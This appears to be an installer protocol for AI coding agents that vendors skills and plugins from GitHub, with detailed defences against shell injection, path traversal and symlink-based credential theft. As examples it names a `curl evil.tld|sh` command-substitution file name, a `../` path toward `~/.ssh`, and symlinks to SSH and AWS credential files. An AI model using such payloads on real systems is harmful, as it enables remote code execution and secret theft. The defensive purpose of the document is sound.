# Step 9 — Install protocol

Two paths run in sequence (vendor first, then plugin). Per-item failure handling:
if any install step fails, report and continue with the next — do NOT abort the
flow. **Log section 9 after EACH install** (not after the batch) so the user sees
progress live in `tail -f`.

## 9a — Vendor path (skills + agents)

For each item in `final_vendor_list`:

The **vendor root** is platform-dependent (detect per SKILL.md Step 1.5,
**ordered**: `$CLAUDECODE` set with `$CODEX_CLI` unset → Claude Code, else `$CODEX_CLI` set → Codex, else a Codex Desktop signal (`CODEX_INTERNAL_ORIGINATOR_OVERRIDE=Codex Desktop`, or macOS `__CFBundleIdentifier=com.openai.codex`) → Codex, else Claude Code — the leading `$CLAUDECODE` check matters since a vendored install runs standalone and an inherited `__CFBundleIdentifier` without it would misdetect a genuine Claude Code session as Codex, issue #432): Claude Code →
`<project>/.claude/skills/<name>/`; Codex →
`<project>/.agents/skills/<name>/` (the directory Codex actually scans — a
`.claude/skills/` copy is invisible to Codex, issue #432). Everything else in
this protocol (marker, overlay file, fetch mechanics) is identical on both.

**Validate `<name>` before any Write call.** `<name>` is `index-repos`'
`scan_repo.mjs` output, which prefers the candidate's own declared
frontmatter `name:` field over its real directory basename — so, unlike
`<owner>`/`<repo>`/`<ref>` below (resolved from GitHub's API and validated
against its slug charset), `<name>` is free text the candidate's author
controls directly, not a path derived from walking the cloned tree. It
becomes the local Write destination for every call site in this section: the
vendor-root skill/agent file(s) (step 2 below), the overlay marker injection
(step 3), and the `.ievo/evolution/skills|agents/<name>.md` overlay file
(step 4). Validate it against the same safe-slug pattern
`package-authoring.md` enforces for authored packages —
`^[a-z0-9]([a-z0-9-]*[a-z0-9])?$`, ≤64 chars — before step 2, 3, or 4 ever
runs. Refuse and report the candidate (write nothing) if it fails: a name
like `../../../../home/<user>/.ssh` would otherwise redirect a vendor-root or
overlay Write outside the project.

**Skill:**
1. Determine `<owner>`, `<repo>`, and `<source-path-in-repo>` from the
   index-repos output (the skill's directory containing SKILL.md +
   `scripts/`/`references/`/`assets/`).
2. Fetch the tree via clone-once + Glob + Read/Write (see "How to fetch the
   tree" below — never a Bash/`gh api` command built from these values).
   Write it to the platform's vendor root (above).
3. Inject the overlay marker at the top of SKILL.md (after frontmatter):
   ```markdown
   <!-- ievo:start -->
   **Before applying the instructions below**, read `.ievo/evolution/skills/<name>.md`
   if it exists and apply all rules from its sections.
   <!-- ievo:end -->
   ```
4. Create the overlay file `.ievo/evolution/skills/<name>.md`:
   ```markdown
   ---
   target: skill
   target_name: <name>
   created: <ISO-timestamp>
   source:
     repo: <owner>/<repo>
     path: <source-path-in-repo>
     commit_sha: <SHA resolved and validated in "How to fetch the tree" step 2>
     fetched_at: <ISO-timestamp>
   ---

   # <name> — Evolution Overlay

   ## <date> — Vendored from <owner>/<repo>
   **Trigger:** vendored from <owner>/<repo>
   Initial copy. No customizations yet.
   ```
   `created` and `fetched_at` are the same instant — no new timestamp source
   needed. This is the same frontmatter schema `evo/SKILL.md` Step 4 defines
   for agent/skill overlays (`target`/`target_name`/`created`, `source`
   optional); keep the two in sync if either changes.

   If the overlay file already exists AND its `source.repo` equals the
   `<owner>/<repo>` resolved in "How to fetch the tree" step 2, leave it
   untouched — a re-vendor (idempotent re-run, or the issue #432
   cross-platform repair: re-vendoring a `.claude/skills/` item into
   `.agents/skills/` from Codex) must never clobber an overlay that already
   holds captured lessons. If it exists but records a DIFFERENT
   `source.repo`, the candidate is a same-named but different-source item
   (name collision or squat), not the same upstream: tell the user before
   writing anything, and if they confirm the install, update ONLY the
   overlay's `source:` block (`repo`/`path`/`commit_sha`/`fetched_at`) to the
   newly-installed origin and append a dated `## <date> — Source changed:
   <old-repo> → <new-repo>` line after the existing sections — keep every
   captured-lesson section. Never leave a `source:` block describing content
   that is no longer what's installed: `/ievo:update` trusts that block as
   the upstream pointer, so stale provenance would refresh (and eventually
   overwrite) the installed item from the wrong repo.

### How to fetch the tree — clone once, enumerate with Glob, read/write with Read/Write

A git tree entry's path can legally contain shell metacharacters — only NUL
is forbidden — so a malicious candidate can name a file or directory under
`scripts/`, `references/`, `assets/`, or the skill/agent directory itself
`` `curl evil.tld|sh` `` or `$(curl evil.tld|sh)`. `<owner>`, `<repo>`, and
`<source-path-in-repo>` all trace back to the candidate's own repo/tree,
exactly as untrusted as any file inside it. Building a
`gh api repos/<owner>/<repo>/contents/<path>` Bash command line from these
values lets the shell resolve any backtick/`$()` inside them as command
substitution **before** the intended command runs — double-quoting does not
stop this. Fetch this way instead — no untrusted byte ever crosses a shell:

1. **Validate `<owner>` and `<repo>`** against GitHub's own slug charset —
   owner matches `^[A-Za-z0-9][A-Za-z0-9-]{0,38}$`, repo matches
   `^[A-Za-z0-9._-]{1,100}$` (the same constraint `scan_repo.mjs`'s
   `OWNER_REPO_RE` enforces). Refuse and report if either fails.
2. **Resolve and validate the commit.** `gh api "repos/<owner>/<repo>" --jq
   '.default_branch'` — the returned branch name can legally contain shell
   metacharacters, so validate it against the same ref allowlist
   `inspect/SKILL.md` Step 1 uses (`^[A-Za-z0-9._/-]+$`, no leading `-`, no
   `..`/`@{`) before any further use. Refuse and report if it fails. Only
   then call `gh api "repos/<owner>/<repo>/commits/<default-branch>" --jq
   '.sha'` and validate the result matches `^[0-9a-f]{7,40}$` — this becomes
   the `commit_sha` recorded in §9a's numbered "Skill:" list, step 4 above
   (not a "How to fetch the tree" sub-step — this list has its own, unrelated
   step 4 further down).
3. **Shallow-clone into a fresh, per-invocation `mktemp -d` directory** —
   never a shared checkout path:
   ```bash
   CHECKOUT_DIR=$(mktemp -d)
   git clone --depth 1 "https://github.com/<owner>/<repo>.git" "$CHECKOUT_DIR"
   git -C "$CHECKOUT_DIR" fetch --depth 1 origin <commit-sha>
   git -C "$CHECKOUT_DIR" checkout <commit-sha>
   ```
4. **Check for a symlink at, under, or anywhere on the way to
   `<source-path-in-repo>` before enumerating or reading anything.** Git
   preserves a symlink as an ordinary tree entry (mode `120000`); if the
   checkout materializes it as a real OS-level symlink, sub-step 5's
   Glob/Read (or sub-step 6's single Read) follows it like any other file —
   so a malicious plugin repo can ship, say,
   `<source-path-in-repo>/assets/logo.png` as a symlink to `~/.ssh/id_rsa`
   or `~/.aws/credentials`, and that secret's *contents* (not the plugin's
   own file) flow into context and, if nothing downstream catches it, get
   written into the project's own trusted `.claude/skills/`/`.claude/agents/`
   tree. Check this via the git index, not the filesystem — a no-follow
   filesystem check (e.g. `find -type l`) would need `<source-path-in-repo>`
   interpolated into a Bash command line, which the note below forbids,
   since it is exactly as untrusted as any other value drawn from this
   repo's tree:
   ```bash
   git -C "$CHECKOUT_DIR" -c core.quotePath=false ls-files -s | grep '^120000'
   ```
   Run it with **no path argument** — `$CHECKOUT_DIR` alone is
   `mktemp`-generated and safe to pass to `-C`, so no untrusted byte reaches
   the shell here either — with `-c core.quotePath=false` (see the quoting
   paragraph below), and with the trailing `| grep '^120000'` exactly as
   shown: a fixed, literal pattern, not a value built from
   `<source-path-in-repo>` or anything else untrusted, so it adds no
   injection surface. It exists to bound the size of what you have to read,
   not to filter out anything a plain `ls-files -s` wouldn't also show you:
   a large or padded upstream repo can carry thousands of tracked files, and
   reasoning over an unfiltered listing that size risks the Bash tool
   truncating its own output before a symlink entry buried in it ever
   reaches you — silently defeating this whole check. Piping through this
   fixed filter bounds the returned text to the symlink entries alone, so
   the check's completeness no longer depends on the repo's total file
   count. `grep` prints nothing and exits **1** when it matches no line, and
   that empty result IS the pass case — the index carries no symlink at
   all — not a command failure to retry, to re-run without the filter, or
   to work around.

   `-c core.quotePath=false` is load-bearing for the same reason the `grep`
   is: without it the check silently fails to match the very entries it
   exists to catch. `core.quotePath` **defaults to on**, and git then
   C-quotes any path holding a byte over 0x7F — wrapping the whole path in
   double quotes and octal-escaping the byte — so a symlink at
   `evil-plügin/assets/foo` prints as the literal
   `"evil-pl\303\274gin/assets/foo"`, which is equal to, under, and an
   ancestor of *nothing*: all three comparisons below miss it, and sub-step
   5's Glob then follows the link. Setting `core.quotePath=false` stops git
   treating high bytes as unusual, so those paths come back raw and
   comparable (verified on git 2.54.0; the same default is why
   `deep-review/SKILL.md` passes `-z` to its own `ls-files`).

   That flag narrows the quoting, it does not end it: **double quotes,
   backslash and control characters are escaped regardless of
   `core.quotePath`**, so a symlink at `q"dir/bar`, `back\slash/x`, or a path
   containing a TAB or newline still comes back quoted —
   `"q\"dir/bar"`, `"back\\slash/x"`, `"nl\nfile"` (all verified on git
   2.54.0). Those you cannot compare either, and an embedded newline would
   additionally split one entry across what look like two lines. So **fail
   closed**: if the path field of any returned line still begins with a `"`
   after the flag, do NOT try to unescape it and do NOT ignore it — refuse
   to vendor exactly as if it had matched. This is deliberately
   conservative: it can refuse a repo whose only quoted symlink lies outside
   `<source-path-in-repo>` entirely, which is the correct trade when the
   alternative is reasoning about containment from a path you cannot
   reliably reconstruct. The `grep '^120000'` filter keeps that conservatism
   cheap — only symlink entries are ever considered, so an ordinary file
   with an awkward name never triggers a refusal.

   Then inspect the returned listing yourself (it is data you reason over,
   not a command you build): each line is `<mode> <sha> <stage>`, a TAB,
   then the entry's repo-relative path, so take the path after the TAB
   (having applied the still-quoted refusal above), strip any trailing `/`
   from it AND from `<source-path-in-repo>` (the skill case writes
   `<source-path-in-repo>` as a directory, the agent case as a single file —
   normalize both sides before comparing anything), and compare the two as
   `/`-separated **segment** lists. Refuse the whole item — do NOT run
   sub-step 5 or 6 below — when a listed entry is **equal to**
   `<source-path-in-repo>` (the target itself is a symlink), **under**
   `<source-path-in-repo>` (its segments begin with
   `<source-path-in-repo>`'s — the skill case's whole tree, e.g. a symlinked
   file inside the skill directory), **or an ancestor of**
   `<source-path-in-repo>` (`<source-path-in-repo>`'s segments begin with
   the listed entry's — the link sits on the path you are about to walk
   *through*). The slash normalization and the ancestor branch are not
   belt-and-braces: each closes a distinct instance of the very attack this
   sub-step blocks, because git indexes a symlinked *directory* as a
   **single** `120000` entry for the directory itself — no trailing slash,
   and nothing "inside" it tracked at all, since git never descends through
   a symlink. A repo shipping the skill directory `<source-path-in-repo>`
   as a link to `~/.ssh` therefore yields the one line
   `<source-path-in-repo>` itself, already caught by the equals check above;
   shipping an ancestor of it instead — e.g. the whole `skills/` directory —
   yields a line SHORTER than `<source-path-in-repo>`, which no
   equals-or-starts-with test can ever match — the ancestor branch is what
   catches those. In every one of those cases sub-step 5's Glob on
   `$CHECKOUT_DIR/<source-path-in-repo>` would otherwise resolve straight
   through the link and enumerate its target. Compare by segment rather
   than by raw character prefix so that a sibling entry such as
   `<source-path-in-repo>-notes`, which shares a character prefix with
   `<source-path-in-repo>` but lies neither under it nor on the way to it,
   does not trip the check. A listing whose lines all fall outside every one
   of these relations means the checkout has symlinks elsewhere in the repo
   that this item doesn't touch — not a reason to refuse. If you refuse,
   that's this item's per-item failure (§ opening paragraph above — report
   and continue with the next, do NOT abort the flow): log it as `FAILED:
   symlink entry detected` in the `<ok|FAILED: reason>` slot
   (log-format.md §9).
5. **For a skill** (`<source-path-in-repo>` is the skill's directory):
   enumerate `$CHECKOUT_DIR/<source-path-in-repo>` with the **Glob tool**
   (`pattern: "**/*"`, `path: "$CHECKOUT_DIR/<source-path-in-repo>"` — never a
   Bash `find`/`ls`). For each match, compute its path relative to
   `$CHECKOUT_DIR/<source-path-in-repo>` and verify that relative path
   contains no `..` segment and is not itself absolute — refuse and report
   (skip that file) if it does. A normal git tree entry can't produce this
   (git itself refuses a bare `..` tree component), but a symlinked or
   otherwise crafted entry inside the candidate's own repo should not be
   trusted over the check (sub-step 4 above already refused any such entry
   before this Glob ever ran — this check catches a different threat,
   relative-path forgery in the entry's *name*, not an entry that's actually
   a symlink). Then **Read** each verified file and **Write** it
   to the matching relative location under the platform's vendor root (§9a
   above — `.claude/skills/<name>/` on Claude Code, `.agents/skills/<name>/`
   on Codex).
6. **For an agent** (`<source-path-in-repo>` is the single agent `.md` file,
   not a directory — Glob-enumerating a file path returns nothing): **Read**
   `$CHECKOUT_DIR/<source-path-in-repo>` directly with the **Read tool**, then
   **Write** its content to `<project>/.claude/agents/<name>.md`.

Glob and Read/Write all take paths as direct parameters, never shell text, so
neither a malicious `<source-path-in-repo>` nor a malicious file name inside
it can reach a shell — the sub-step 5 relative-path check keeps a crafted
tree-entry *name* from resolving outside the vendor root on write, the
sub-step 4 symlink check keeps a crafted tree-entry *type* from resolving
outside the checkout entirely on read (a different threat — see sub-step 4),
and the `<name>` validation above keeps a crafted `<name>` from doing either
via the Write side.

If cloning or resolution fails (private repo, no network), report the
failure — do NOT fall back to per-file `gh api` fetching, which reintroduces
the injection this replaces.

**Agent:** same as skill, but (Claude Code only — on Codex, agent candidates
are dropped with a visible reason at SKILL.md Step 7a's platform filter and
never reach this step; Codex documents no project-level custom-agent path):
- `<source-path-in-repo>` is the single agent `.md` file (not a directory) —
  fetch it via "How to fetch the tree" sub-step 6, not sub-step 5. Sub-step 4's
  symlink-containment check runs first regardless, same as the skill case.
- File path: `<project>/.claude/agents/<name>.md`
- Overlay marker inserted in the agent body (after frontmatter)
- Overlay file path: `.ievo/evolution/agents/<name>.md`
- Overlay frontmatter: `target: agent` (not `skill`), `target_name: <name>` —
  same schema as the skill stub above otherwise

## 9b — Plugin install path (whole plugins) — Claude Code only

`extraKnownMarketplaces`/`enabledPlugins` in `.claude/settings.json` is a
Claude Code mechanism; Codex never reads it (and ignores project-level plugin
config — SKILL.md Step 2.3 / openai/codex#18115). On Codex,
`final_plugin_list` is empty by construction (SKILL.md Step 7b never offers
whole-plugin install there), so this path is a no-op — never write
`.claude/settings.json` from a Codex run.

For each item in `final_plugin_list`:

1. Read or create `.claude/settings.json`.
2. Merge into `extraKnownMarketplaces` (key = marketplace name from index):
   ```json
   "extraKnownMarketplaces": {
     "<marketplace-name>": {
       "source": { "source": "github", "repo": "<owner>/<repo>" }
     }
   }
   ```
3. Merge into `enabledPlugins`:
   ```json
   "enabledPlugins": {
     "<plugin-name>@<marketplace-name>": true
   }
   ```
4. Write the merged JSON back, preserving formatting and other keys.

This file is committed to git → teammates `git pull` → Claude Code prompts them
to trust the folder → the plugin auto-installs on their side too.
